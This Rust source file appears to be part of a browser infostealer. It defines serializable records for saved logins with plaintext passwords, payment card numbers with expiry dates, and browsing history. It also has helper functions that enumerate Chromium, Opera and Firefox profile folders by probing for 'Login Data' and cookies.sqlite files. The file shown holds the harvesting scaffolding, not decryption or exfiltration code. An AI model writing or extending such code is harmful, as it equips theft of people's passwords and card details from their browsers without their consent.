use serde::Serialize;

use std::{
    path::{PathBuf},
};


#[derive(Debug, Serialize)]
pub struct Login {
    pub browser: String,
    pub profile: String,
    pub url: String,
    pub username: String,
    pub password: String
}

#[derive(Debug, Serialize)]
pub struct Card {
    pub browser: String,
    pub profile: String,
    pub name: String,
    pub number: String,
    pub exp: String,
}

#[derive(Debug, Serialize)]
pub struct History {
    pub url: String,
    pub title: String,
    pub visit_count: u32
}

pub fn get_browser_name(browser_dir: PathBuf) -> String {
    let browser_name = browser_dir
    .file_name()
    .unwrap()
    .to_str()
    .unwrap()
    .split('\\')
    .last()
    .unwrap();

    browser_name.replace(" ", "")
}

pub mod chromium {
    use std::{
        fs,
        path::{PathBuf},
    };

    pub fn get_user_data_dir(chromunium_dir: &PathBuf) -> PathBuf {
        let mut user_data_dir = chromunium_dir.to_owned();
    
        if !chromunium_dir.to_string_lossy().contains("Opera Software") {
            user_data_dir = user_data_dir.join("User Data");
        }
    
        user_data_dir
    }
    
    pub fn get_profile_path(user_data_dir: &PathBuf, profile: String) -> PathBuf {
        let mut login_data_path = user_data_dir.to_owned();
    
        if !user_data_dir.to_string_lossy().contains("Opera Software") {
            login_data_path = login_data_path.join(profile);
        }
    
        login_data_path
    }
    
    pub fn get_profile_names(user_data_dir: &PathBuf) -> Vec<String> {
        let mut profile_names = Vec::new();
    
        for entry in fs::read_dir(user_data_dir).unwrap() {
            let entry = entry.unwrap();
            let path = entry.path();
    
            if path.is_dir() {
                let profile = path.join("Login Data");
    
                if profile.exists() {
                    if let Some(name) = path.file_name() {
                        profile_names.push(name.to_string_lossy().to_string());
                    }
                }
            }
        }
    
        profile_names
    }
}

pub mod gecko {
    use std::{
        fs,
        path::{PathBuf},
    };
    
    pub fn get_user_data_dir(gecko_dir: &PathBuf) -> PathBuf {
        let mut user_data_dir = gecko_dir.to_owned();
            
        user_data_dir = user_data_dir.join("Profiles");
    
        user_data_dir
    }
    
    pub fn get_profile_names(user_data_dir: &PathBuf) -> Vec<String> {
        let mut profile_names = Vec::new();
    
        for entry in fs::read_dir(user_data_dir).unwrap() {
            let entry = entry.unwrap();
            let path = entry.path();
    
            if path.is_dir() {
                let profile = path.join("cookies.sqlite");
    
                if profile.exists() {
                    if let Some(name) = path.file_name() {
                        profile_names.push(name.to_string_lossy().to_string());
                    }
                }
            }
        }
    
        profile_names
    }
}